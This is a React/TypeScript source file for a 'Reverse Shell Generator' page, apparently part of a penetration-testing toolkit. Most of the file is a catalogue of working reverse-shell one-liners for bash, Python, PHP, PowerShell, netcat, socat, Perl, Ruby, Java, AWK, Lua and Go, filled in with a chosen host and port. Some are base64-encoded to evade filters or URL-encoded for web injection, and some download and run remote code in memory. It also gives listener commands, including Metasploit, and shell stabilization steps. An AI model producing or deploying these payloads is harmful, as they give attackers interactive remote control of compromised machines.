import React, { useState, useCallback, useMemo } from 'react';
import { Terminal, Zap, Shield, RefreshCw } from 'lucide-react';
import { CopyButton } from '../../CopyButtons';
import { ToolPageHeader, SectionCard, FormField, CollapsibleSection } from '../ui';

// ─── Props ────────────────────────────────────────────────────────
interface ReverseShellProps {
    rhost: string;
    lhost: string;
}

// ─── Types ───────────────────────────────────────────────────────
type Category = 'bash' | 'python' | 'php' | 'powershell' | 'perl' | 'ruby' | 'java' | 'netcat' | 'socat' | 'other';

interface ShellEntry {
    id: string;
    label: string;
    category: Category;
    description: string;
    cmd: (lhost: string, port: string) => string;
    encode?: boolean; // hint: URL-encode when injecting via web
    windows?: boolean;
    linux?: boolean;
}

// ─── Shell Definitions ────────────────────────────────────────────
const SHELLS: ShellEntry[] = [
    // ── Bash ──────────────────────────────────────────────────────
    {
        id: 'bash-tcp',
        label: 'Bash TCP',
        category: 'bash',
        description: 'Classic bash redirect over TCP — most reliable on Linux targets.',
        linux: true,
        cmd: (l, p) => `bash -i >& /dev/tcp/${l}/${p} 0>&1`,
    },
    {
        id: 'bash-tcp-196',
        label: 'Bash TCP (fd 196)',
        category: 'bash',
        description: 'Uses explicit file descriptor — works around some shell restrictions.',
        linux: true,
        cmd: (l, p) => `0<&196;exec 196<>/dev/tcp/${l}/${p}; sh <&196 >&196 2>&196`,
    },
    {
        id: 'bash-udp',
        label: 'Bash UDP',
        category: 'bash',
        description: 'UDP variant — useful when TCP egress is filtered.',
        linux: true,
        cmd: (l, p) => `sh -i >& /dev/udp/${l}/${p} 0>&1`,
    },
    {
        id: 'bash-b64',
        label: 'Bash Base64',
        category: 'bash',
        description: 'Base64-encoded payload — bypasses simple string filters.',
        linux: true,
        cmd: (l, p) => {
            const inner = `bash -i >& /dev/tcp/${l}/${p} 0>&1`;
            const b64 = btoa(inner);
            return `echo ${b64} | base64 -d | bash`;
        },
    },

    // ── Python ────────────────────────────────────────────────────
    {
        id: 'python3-socket',
        label: 'Python3 Socket',
        category: 'python',
        description: 'Pure socket — no subprocess dependency.',
        linux: true,
        cmd: (l, p) =>
            `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${l}",${p}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
    },
    {
        id: 'python3-subprocess',
        label: 'Python3 Subprocess',
        category: 'python',
        description: 'Uses subprocess — works when pty module is unavailable.',
        linux: true,
        cmd: (l, p) =>
            `python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("${l}",${p}));subprocess.call(["/bin/sh"],stdin=s,stdout=s,stderr=s)'`,
    },
    {
        id: 'python2-socket',
        label: 'Python2 Socket',
        category: 'python',
        description: 'Python 2 variant — for older targets.',
        linux: true,
        cmd: (l, p) =>
            `python -c 'import socket,os,pty;s=socket.socket();s.connect(("${l}",${p}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`,
    },
    {
        id: 'python-windows',
        label: 'Python3 Windows',
        category: 'python',
        description: 'cmd.exe shell for Windows targets via Python.',
        windows: true,
        cmd: (l, p) =>
            `python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("${l}",${p}));subprocess.call(["cmd.exe"],stdin=s,stdout=s,stderr=s)'`,
    },

    // ── PHP ───────────────────────────────────────────────────────
    {
        id: 'php-exec',
        label: 'PHP exec()',
        category: 'php',
        description: 'One-liner via exec — inject into eval or webshell.',
        linux: true,
        encode: true,
        cmd: (l, p) =>
            `php -r '$sock=fsockopen("${l}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    },
    {
        id: 'php-shell-exec',
        label: 'PHP shell_exec()',
        category: 'php',
        description: 'Uses shell_exec — alternative when exec is disabled.',
        linux: true,
        encode: true,
        cmd: (l, p) =>
            `php -r '$sock=fsockopen("${l}",${p});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`,
    },
    {
        id: 'php-passthru',
        label: 'PHP passthru()',
        category: 'php',
        description: 'passthru variant — useful when other functions are blacklisted.',
        linux: true,
        encode: true,
        cmd: (l, p) =>
            `php -r '$sock=fsockopen("${l}",${p});passthru("/bin/sh -i <&3 >&3 2>&3");'`,
    },
    {
        id: 'php-pentestmonkey',
        label: 'PHP PentestMonkey',
        category: 'php',
        description: 'Classic reverse shell script — upload and browse to trigger.',
        linux: true,
        cmd: (l, p) =>
            `# Download the shell:\nwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n\n# Edit LHOST / LPORT:\nsed -i "s/127.0.0.1/${l}/g; s/1234/${p}/g" php-reverse-shell.php`,
    },

    // ── PowerShell ────────────────────────────────────────────────
    {
        id: 'ps-tcp',
        label: 'PowerShell TCP',
        category: 'powershell',
        description: 'Pure PowerShell TCP — no binaries needed.',
        windows: true,
        cmd: (l, p) =>
            `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${l}",${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    },
    {
        id: 'ps-b64',
        label: 'PowerShell B64',
        category: 'powershell',
        description: 'Base64-encoded PowerShell — avoids quote escaping issues.',
        windows: true,
        cmd: (l, p) => {
            const inner = `$client = New-Object System.Net.Sockets.TCPClient('${l}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
            // UTF-16LE base64 (how PowerShell -EncodedCommand expects it)
            let b64 = '';
            try {
                const utf16 = Array.from(inner).map(c => String.fromCharCode(c.charCodeAt(0), 0)).join('');
                b64 = btoa(utf16);
            } catch {
                b64 = btoa(inner);
            }
            return `powershell -EncodedCommand ${b64}`;
        },
    },
    {
        id: 'ps-nishang',
        label: 'Nishang Invoke-PowerShellTcp',
        category: 'powershell',
        description: 'Downloads and executes Nishang shell in memory.',
        windows: true,
        cmd: (l, p) =>
            `# On your machine — serve the file:\npython3 -m http.server 80\n\n# On target:\npowershell IEX(New-Object Net.WebClient).DownloadString('http://${l}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ${l} -Port ${p}`,
    },

    // ── Netcat ────────────────────────────────────────────────────
    {
        id: 'nc-traditional',
        label: 'Netcat (traditional)',
        category: 'netcat',
        description: 'Traditional netcat with -e — older versions only.',
        linux: true,
        cmd: (l, p) => `nc -e /bin/sh ${l} ${p}`,
    },
    {
        id: 'nc-openbsd',
        label: 'Netcat (OpenBSD)',
        category: 'netcat',
        description: 'OpenBSD netcat without -e — uses named pipe trick.',
        linux: true,
        cmd: (l, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${l} ${p} >/tmp/f`,
    },
    {
        id: 'nc-windows',
        label: 'Netcat Windows',
        category: 'netcat',
        description: 'netcat for Windows — requires nc.exe on target.',
        windows: true,
        cmd: (l, p) => `nc.exe -e cmd.exe ${l} ${p}`,
    },
    {
        id: 'ncat',
        label: 'Ncat (nmap)',
        category: 'netcat',
        description: 'Ncat from nmap suite — supports SSL.',
        linux: true,
        cmd: (l, p) => `ncat ${l} ${p} -e /bin/bash`,
    },

    // ── Socat ─────────────────────────────────────────────────────
    {
        id: 'socat-basic',
        label: 'Socat Basic',
        category: 'socat',
        description: 'Simple socat shell.',
        linux: true,
        cmd: (l, p) => `socat TCP:${l}:${p} EXEC:/bin/sh`,
    },
    {
        id: 'socat-pty',
        label: 'Socat PTY (fully interactive)',
        category: 'socat',
        description: 'Fully interactive PTY — best for stable shell. Requires socat on listener too.',
        linux: true,
        cmd: (l, p) => `socat TCP:${l}:${p} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
    },
    {
        id: 'socat-listener',
        label: 'Socat Listener (your machine)',
        category: 'socat',
        description: 'Listener command to pair with the socat PTY shell above.',
        linux: true,
        cmd: (_l, p) => `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:${p}`,
    },

    // ── Perl ──────────────────────────────────────────────────────
    {
        id: 'perl-socket',
        label: 'Perl Socket',
        category: 'perl',
        description: 'Pure Perl socket shell — common on older Linux systems.',
        linux: true,
        cmd: (l, p) =>
            `perl -e 'use Socket;$i="${l}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    },

    // ── Ruby ──────────────────────────────────────────────────────
    {
        id: 'ruby-socket',
        label: 'Ruby Socket',
        category: 'ruby',
        description: 'Ruby one-liner — works on both Linux and macOS.',
        linux: true,
        cmd: (l, p) =>
            `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${l}","${p}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    },

    // ── Java ──────────────────────────────────────────────────────
    {
        id: 'java-runtime',
        label: 'Java Runtime.exec()',
        category: 'java',
        description: 'Java runtime execution — useful in RCE on Java apps (Struts, Log4Shell, etc.).',
        linux: true,
        cmd: (l, p) =>
            `r = Runtime.getRuntime();\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${l}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);\np.waitFor()`,
    },

    // ── Other ─────────────────────────────────────────────────────
    {
        id: 'awk',
        label: 'AWK',
        category: 'other',
        description: 'AWK one-liner — surprisingly common on minimal Linux installs.',
        linux: true,
        cmd: (l, p) =>
            `awk 'BEGIN {s = "/inet/tcp/0/${l}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/stdin`,
    },
    {
        id: 'lua',
        label: 'Lua',
        category: 'other',
        description: 'Lua socket shell — found on embedded systems, game servers.',
        linux: true,
        cmd: (l, p) =>
            `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${l}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
    },
    {
        id: 'golang',
        label: 'Go (compile on target)',
        category: 'other',
        description: 'Go source — compile and run on target if Go is available.',
        linux: true,
        cmd: (l, p) =>
            `# Save as shell.go and compile:\ncat > /tmp/shell.go << 'EOF'\npackage main\nimport ("net";"os";"os/exec")\nfunc main() {\n  c, _ := net.Dial("tcp", "${l}:${p}")\n  cmd := exec.Command("/bin/sh")\n  cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c\n  cmd.Run()\n}\nEOF\ngo run /tmp/shell.go`,
    },
];

// ─── Stabilization Techniques ─────────────────────────────────────
const STABILIZE_STEPS = [
    {
        title: 'Python PTY spawn',
        cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'`,
        note: 'Run on target — spawns a proper PTY',
    },
    {
        title: 'Background & stty raw',
        cmd: `# Ctrl+Z  →  background the shell\nstty raw -echo; fg`,
        note: 'Run on YOUR machine — enables raw mode',
    },
    {
        title: 'Fix terminal size',
        cmd: `# On your machine first:\nstty size\n\n# Then on target:\nstty rows <rows> cols <cols>\nexport TERM=xterm`,
        note: 'Fixes arrow keys, tab completion, Ctrl+C',
    },
    {
        title: 'rlwrap listener (easy mode)',
        cmd: `rlwrap nc -lvnp <port>`,
        note: 'Wrap netcat with readline — instant history & arrows',
    },
];

// ─── Listener Commands ────────────────────────────────────────────
const LISTENERS = [
    { label: 'Netcat', cmd: (p: string) => `nc -lvnp ${p}` },
    { label: 'Ncat', cmd: (p: string) => `ncat -lvnp ${p}` },
    { label: 'Socat PTY', cmd: (p: string) => `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:${p},reuseaddr` },
    { label: 'rlwrap nc', cmd: (p: string) => `rlwrap nc -lvnp ${p}` },
    { label: 'Metasploit', cmd: (p: string) => `msfconsole -q -x "use multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LPORT ${p}; run"` },
];

const CATEGORIES: { id: Category; label: string }[] = [
    { id: 'bash', label: 'Bash' },
    { id: 'python', label: 'Python' },
    { id: 'php', label: 'PHP' },
    { id: 'powershell', label: 'PowerShell' },
    { id: 'netcat', label: 'Netcat' },
    { id: 'socat', label: 'Socat' },
    { id: 'perl', label: 'Perl' },
    { id: 'ruby', label: 'Ruby' },
    { id: 'java', label: 'Java' },
    { id: 'other', label: 'Other' },
];

// ─── Component ────────────────────────────────────────────────────
export default function ReverseShell({ rhost, lhost }: ReverseShellProps) {
    const [port, setPort] = useState('4444');
    const [customLhost, setCustomLhost] = useState('');
    const [activeCategory, setActiveCategory] = useState<Category>('bash');
    const [osFilter, setOsFilter] = useState<'all' | 'linux' | 'windows'>('all');
    const [selectedShell, setSelectedShell] = useState<ShellEntry | null>(null);

    const effectiveLhost = customLhost || lhost || '$LHOST';
    const effectivePort = port || '4444';

    const filteredShells = useMemo(() => {
        return SHELLS.filter(s => {
            if (s.category !== activeCategory) return false;
            if (osFilter === 'linux' && !s.linux) return false;
            if (osFilter === 'windows' && !s.windows) return false;
            return true;
        });
    }, [activeCategory, osFilter]);

    // Auto-select first shell when category/filter changes
    React.useEffect(() => {
        setSelectedShell(filteredShells[0] ?? null);
    }, [filteredShells]);

    const generatedCommand = selectedShell
        ? selectedShell.cmd(effectiveLhost, effectivePort)
        : '';

    return (
        <>
            <ToolPageHeader
                icon={Terminal}
                title="Reverse Shell"
                highlight="Generator"
                subtitle="PAYLOAD_BUILDER & LISTENER_REFERENCE"
                color="red"
            />

            {/* ── Connection Config ── */}
            <SectionCard title="Connection Config">

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    {/* LHOST override */}
                    <div>
                        <label className="block text-[10px] font-mono text-slate-500 uppercase tracking-widest mb-1.5">
                            LHOST <span className="text-slate-600">// Your IP</span>
                        </label>
                        <input
                            type="text"
                            value={customLhost}
                            onChange={e => setCustomLhost(e.target.value.replace(/[^0-9a-fA-F.:]/g, ''))}
                            placeholder={lhost || '10.10.14.xx'}
                            className="w-full bg-slate-900/70 border border-slate-700/60 rounded-xl px-4 py-3 text-sm font-mono text-cyan-400 placeholder-slate-600 focus:outline-none focus:border-cyan-500/50 focus:shadow-[0_0_15px_-4px_rgba(6,182,212,0.2)] transition-all"
                        />
                        {!customLhost && lhost && (
                            <p className="text-[10px] font-mono text-slate-600 mt-1">
                                Using RHOST bar value: <span className="text-cyan-500/60">{lhost}</span>
                            </p>
                        )}
                    </div>

                    {/* Port */}
                    <div>
                        <label className="block text-[10px] font-mono text-slate-500 uppercase tracking-widest mb-1.5">
                            LPORT <span className="text-slate-600">// Listener port</span>
                        </label>
                        <div className="flex gap-2">
                            <input
                                type="text"
                                value={port}
                                onChange={e => setPort(e.target.value.replace(/\D/g, '').slice(0, 5))}
                                placeholder="4444"
                                className="flex-1 bg-slate-900/70 border border-slate-700/60 rounded-xl px-4 py-3 text-sm font-mono text-red-400 placeholder-slate-600 focus:outline-none focus:border-red-500/50 focus:shadow-[0_0_15px_-4px_rgba(239,68,68,0.2)] transition-all"
                            />
                            {/* Quick port presets */}
                            <div className="flex gap-1">
                                {['443', '80', '1337', '9001'].map(p => (
                                    <button
                                        key={p}
                                        onClick={() => setPort(p)}
                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold font-mono transition-all border ${port === p
                                                ? 'bg-red-500/20 border-red-500/40 text-red-400'
                                                : 'bg-slate-800/50 border-slate-700/40 text-slate-500 hover:text-slate-300 hover:border-slate-600'
                                            }`}
                                    >
                                        {p}
                                    </button>
                                ))}
                            </div>
                        </div>
                    </div>
                </div>

                {/* OS Filter */}
                <div className="flex items-center gap-3">
                    <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest">OS Target:</span>
                    <div className="flex bg-slate-900 border border-slate-700/50 p-1 rounded-xl">
                        {(['all', 'linux', 'windows'] as const).map(os => (
                            <button
                                key={os}
                                onClick={() => setOsFilter(os)}
                                className={`px-4 py-1.5 rounded-lg text-xs font-bold transition-all ${osFilter === os
                                        ? 'bg-slate-700 text-white'
                                        : 'text-slate-500 hover:text-slate-300'
                                    }`}
                            >
                                {os.charAt(0).toUpperCase() + os.slice(1)}
                            </button>
                        ))}
                    </div>
                </div>
            </SectionCard>

            {/* ── Category Tabs ── */}
            <SectionCard title="Language / Tool">
                <div className="flex flex-wrap gap-2">
                    {CATEGORIES.map(cat => {
                        const count = SHELLS.filter(s => {
                            if (s.category !== cat.id) return false;
                            if (osFilter === 'linux' && !s.linux) return false;
                            if (osFilter === 'windows' && !s.windows) return false;
                            return true;
                        }).length;
                        if (count === 0) return null;
                        return (
                            <button
                                key={cat.id}
                                onClick={() => setActiveCategory(cat.id)}
                                className={`flex items-center gap-1.5 px-4 py-2 rounded-xl text-xs font-bold tracking-wide transition-all border ${activeCategory === cat.id
                                        ? 'bg-red-500/10 border-red-500/30 text-red-400 shadow-[0_0_16px_-4px_rgba(239,68,68,0.3)]'
                                        : 'bg-slate-900/40 border-slate-700/30 text-slate-500 hover:text-slate-300 hover:border-slate-600'
                                    }`}
                            >
                                {cat.label}
                                <span className={`text-[9px] px-1.5 py-0.5 rounded-md font-mono ${activeCategory === cat.id ? 'bg-red-500/20 text-red-300' : 'bg-slate-800 text-slate-600'
                                    }`}>{count}</span>
                            </button>
                        );
                    })}
                </div>

                {/* Shell variants within category */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    {filteredShells.map(shell => (
                        <button
                            key={shell.id}
                            onClick={() => setSelectedShell(shell)}
                            className={`flex flex-col items-start gap-1 px-4 py-3 rounded-xl text-left transition-all border ${selectedShell?.id === shell.id
                                    ? 'bg-red-500/10 border-red-500/30 text-red-400'
                                    : 'bg-slate-900/30 border-slate-800/50 text-slate-500 hover:text-slate-300 hover:border-slate-600'
                                }`}
                        >
                            <div className="flex items-center gap-2 w-full">
                                <span className="text-xs font-bold font-mono">{shell.label}</span>
                                <div className="flex gap-1 ml-auto">
                                    {shell.linux && (
                                        <span className="text-[9px] px-1.5 py-0.5 rounded bg-slate-800 text-slate-500 font-mono">Linux</span>
                                    )}
                                    {shell.windows && (
                                        <span className="text-[9px] px-1.5 py-0.5 rounded bg-blue-900/30 text-blue-500/70 font-mono">Win</span>
                                    )}
                                    {shell.encode && (
                                        <span className="text-[9px] px-1.5 py-0.5 rounded bg-yellow-900/20 text-yellow-500/70 font-mono">URL-enc</span>
                                    )}
                                </div>
                            </div>
                            <span className="text-[10px] text-slate-600 leading-relaxed">{shell.description}</span>
                        </button>
                    ))}
                </div>
            </SectionCard>

            {/* ── Generated Payload ── */}
            {selectedShell && (
                <div className="bg-slate-900/50 border border-red-500/20 rounded-2xl p-5 space-y-3 shadow-[0_0_30px_-8px_rgba(239,68,68,0.15)]">
                    <div className="flex items-center justify-between">
                        <h4 className="text-xs font-bold text-red-400 uppercase tracking-wider flex items-center gap-2">
                            <Zap className="w-3.5 h-3.5" />
                            {selectedShell.label}
                        </h4>
                        <div className="flex items-center gap-2">
                            {selectedShell.encode && (
                                <span className="text-[10px] font-mono text-yellow-500/70 bg-yellow-500/10 border border-yellow-500/20 px-2 py-1 rounded-lg">
                                    URL-encode before injecting
                                </span>
                            )}
                            <CopyButton text={generatedCommand} />
                        </div>
                    </div>
                    <div className="bg-[#0b0f19] border border-red-500/10 rounded-xl p-4">
                        <pre className="text-sm font-mono text-green-400/90 whitespace-pre-wrap break-all leading-relaxed select-all">
                            {generatedCommand}
                        </pre>
                    </div>

                    {/* URL-encoded version */}
                    {selectedShell.encode && (
                        <div className="space-y-2">
                            <p className="text-[10px] font-mono text-slate-500 uppercase tracking-widest">URL-encoded:</p>
                            <div className="bg-[#0b0f19] border border-slate-800/60 rounded-xl p-4 flex items-start gap-2">
                                <pre className="flex-1 text-xs font-mono text-yellow-400/80 whitespace-pre-wrap break-all leading-relaxed">
                                    {encodeURIComponent(generatedCommand)}
                                </pre>
                                <CopyButton text={encodeURIComponent(generatedCommand)} />
                            </div>
                        </div>
                    )}
                </div>
            )}

            {/* ── Listener Commands ── */}
            <CollapsibleSection title="Start Your Listener" icon={Shield} defaultOpen={true}>
                <div className="space-y-2">
                    {LISTENERS.map(listener => {
                        const cmd = listener.cmd(effectivePort);
                        return (
                            <div key={listener.label} className="bg-[#0b0f19] border border-slate-800/50 rounded-xl px-4 py-3 flex items-center gap-3 group/cmd">
                                <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest w-24 flex-shrink-0">{listener.label}</span>
                                <code className="flex-1 text-xs font-mono text-green-400/80 break-all">{cmd}</code>
                                <CopyButton text={cmd} />
                            </div>
                        );
                    })}
                </div>
            </CollapsibleSection>

            {/* ── Shell Stabilization ── */}
            <CollapsibleSection title="Shell Stabilization" icon={RefreshCw}>
                <div className="space-y-3">
                    <p className="text-[11px] text-slate-500 font-mono">
                        Raw reverse shells break on Ctrl+C and lack tab completion. Stabilize immediately after catching the shell.
                    </p>
                    {STABILIZE_STEPS.map((step, i) => (
                        <div key={i} className="bg-slate-900/30 border border-slate-800/30 rounded-xl p-4 space-y-2">
                            <div className="flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    <span className="text-[10px] font-bold font-mono text-cyan-500/60 bg-cyan-500/10 border border-cyan-500/20 w-5 h-5 rounded-md flex items-center justify-center">{i + 1}</span>
                                    <span className="text-xs font-bold text-white">{step.title}</span>
                                </div>
                                <CopyButton text={step.cmd} />
                            </div>
                            <div className="bg-[#0b0f19] border border-slate-800/50 rounded-lg px-3 py-2">
                                <pre className="text-xs font-mono text-green-400/80 whitespace-pre-wrap">{step.cmd}</pre>
                            </div>
                            <p className="text-[10px] text-slate-500 font-mono">{step.note}</p>
                        </div>
                    ))}
                </div>
            </CollapsibleSection>
        </>
    );
}